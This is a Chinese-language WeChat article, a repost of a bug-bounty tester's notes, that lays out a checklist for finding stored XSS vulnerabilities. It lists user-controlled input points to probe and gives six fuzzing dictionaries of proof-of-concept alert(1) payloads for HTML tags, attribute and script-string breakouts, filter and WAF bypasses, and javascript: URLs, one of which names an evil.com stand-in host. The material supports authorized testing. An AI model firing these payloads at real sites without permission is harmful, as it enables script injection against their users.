---
title: 存储型XSS漏洞checklist
url: https://mp.weixin.qq.com/s/x_BegxiS3Zd4YbxZ9VuWEQ
source: Doonsec's feed
date: 2026-02-26
fetch_date: 2026-02-27T04:06:13.311572
---

# 存储型XSS漏洞checklist

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8tDOXFoCoQicSMyX8ca9ILicp0SjJcd07bRdTbZGdeg4TnbL16NRzXTr8gFibzdVTWSlql6kmBjYLwHFAW76NiaoURNcSAcnfomfibuQzFZq2JVU/0?wx_fmt=jpeg)

# 存储型XSS漏洞checklist

sec0nd安全

![]()

在小说阅读器中沉浸阅读

以下文章来源于山水SRC
，作者游山玩水

![](http://wx.qlogo.cn/mmhead/wbKdib81ny6806vSWjZfgcbibvhK9W9Azf0pJC41PQ7uNsdcuiaXURKHcTd10sgCVpeMUSl5AJRqho/0)

**山水SRC**
.

个人学习src的笔记总结

## 概述

本文讲解了在渗透测试中测试存储型XSS的checklist（检查表单）

## 位置寻找

识别并枚举所有用户可以控制输入（找能输入内容的地方）

存储型XSS的利用链是：**攻击者提交恶意输入 → 应用将输入存入数据库/文件 → 其他用户（或管理员）访问特定页面 → 应用从存储中读取并输出该数据到页面 → 恶意脚本在受害者浏览器中执行**。

将测试重点放在以下类型的用户可控输入点上：

1. 用户生成内容

+ 论坛/评论/留言板：帖子、评论、回复。
+ 博客/文章系统：评论、用户签名。
+ 聊天/客服系统：聊天消息。
+ 商品/服务评价：评价内容、评分标题。
+ 文档/文件协作平台：文档内容、批注。

2. 用户配置文件与账户信息

+ 昵称/显示名称：在帖子、评论列表、私信等各处显示。
+ 个人简介/签名栏：通常支持一定格式。
+ 联系信息：邮箱、网站地址（特别注意`网站`字段，常被用作`javascript:`伪协议注入点）。
+ 头像：头像图片的URL或上传功能（文件名可能被输出）。

3. 系统功能与交互点

+ 站内信/私信：收件人、标题、内容。
+ 订单/交易系统：订单备注、收货人姓名（可能在管理后台显示）。
+ 工单/反馈系统：问题描述、联系方式。
+ 搜索功能：搜索关键词有时会被记录并展示在“搜索历史”或“热门搜索”中。
+ 文件上传功能：文件名、文件元数据（如EXIF信息）、甚至文件内容（如SVG、HTML文件）。

4. 管理员与后台功能

+ 任何管理员可以编辑并影响前台用户显示的内容，如网站标题、公告、广告代码等。这些点一旦被入侵，影响范围广。

## 测试步骤

1.在测试位置输入<b>test</b>

2.按f12查看源码，看输入内容的位置和情况

3.根据源码情况进行爆破（使用bp的intruder模块）

#### **字典1：HTML标签注入（**`<b>test</b>`**被解析为粗体时用）**

当`<b>test</b>`成功渲染，证明可插入HTML标签。

```
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<object data=javascript:alert(1)>
<math><brute href=javascript:alert(1)>click
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadstart=alert(1)><source>
```

#### **字典2：属性注入（输入点位于**`value=“...”`**等属性内时用）**

当输入点在属性值内，尝试闭合引号并添加事件。

```
" onmouseover=alert(1)
' onmouseover=alert(1)
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
" onfocus=alert(1) autofocus
" onload=alert(1)
" onerror=alert(1)
" onscroll=alert(1)
" oninput=alert(1)
" onchange=alert(1)
```

#### **字典3：JavaScript上下文注入（输入点在**`<script>var a = “...”`**内时用）**

当输入点在JS字符串中，尝试闭合字符串执行代码。

```
';alert(1);//
";alert(1);//
';alert(1)//
";alert(1)//
</script><script>alert(1)</script>
`;alert(1)//
\';alert(1)//
\";alert(1)//
');alert(1);//
");alert(1);//
```

#### **字典4：绕过过滤（**`<b>test</b>`**被过滤/删除时用）**

当标签被过滤时，尝试大小写、编码、非常规标签等绕过。

```
<ScRiPt>alert(1)</script>
<scr<script>ipt>alert(1)</script>
<svg/onload=alert(1)
<img%0dsrc=1%0donerror=alert(1)>
<img src=1 onerror=&#97;lert(1)>
<IMG SRC=javascript:alert(1)>
<img src="x" onerror="alert(1)">
<image src=1 onerror=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
```

#### **字典5：URL/伪协议注入（输入点在**`href`**、**`src、action`**等URL属性时用）**

当输入点可用于设置链接地址时。

```
javascript:alert(1)
javascript:alert(1);
JavasCRipt:alert(1)
javascript:alert(1)
jav&#x09;ascript:alert(1)
data:text/html,<script>alert(1)</script>
http://evil.com?x=javascript:alert(1)
```

#### **字典6：通用探测与高级绕过（当上述基础方法失败时尝试）**

一些较新或特殊的Payload，用于探测和绕过复杂WAF。

```
<svg><script>alert(1)</script>
<svg><script>alert(1)
<iframe onload=location=['javascript:alert(1)'].join()>
<body/onload=Function(alert(1))()>
<svg/onload=eval(URL.slice(-6))>#alert(1)
<body onload=setTimeout(location.hash.substr(1))()>#alert(1)
<input autofocus onblur=alert(1)>
<keygen autofocus onfocus=alert(1)>
<form onsubmit=alert(1)><input type=submit>
<select onchange=alert(1)><option>1<option>2
```

上面这些字典是从下面项目的xss模块里根据实际测试情况筛选出来的

地址：https://github.com/TheKingOfDuck/fuzzDicts

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8tDOXFoCoQiccatQbkwwSR1TB4qzj9dV9ZXb62kOPdiabz0lTjPIekFMALHKxZRhSGiay7kQCdWOxYTTphIOopKEoWe31GhlJJuy1jN45MH9fk/640?wx_fmt=png&from=appmsg)

该项目视图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8tDOXFoCoQibsibvtR9UCica1eKwJQoU4128jYzBX6GZOG1YBLWHthe1NLW2BQ1IEqS2NdW9V2QG7TlsoYcV9hwM0UaQToBRh79M1iayFJtLrwQ/640?wx_fmt=png&from=appmsg)

## 总结

本来我想着xss漏洞和sql注入差不多，用自动化工具就行，但看了一些文章感觉都不咋好用，有好用的xss漏洞检测工具可以发到评论区让参考

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/u7ibmWw94HhyPjaGFbJ1aj02bPU5jwAmG8o7vJ9jgF7q3DaU2c6Bicqz1ZTLTRWLc188vgsWFMnyNE6CX8Y1zSaw/0?wx_fmt=png)

sec0nd安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/u7ibmWw94HhyPjaGFbJ1aj02bPU5jwAmG8o7vJ9jgF7q3DaU2c6Bicqz1ZTLTRWLc188vgsWFMnyNE6CX8Y1zSaw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过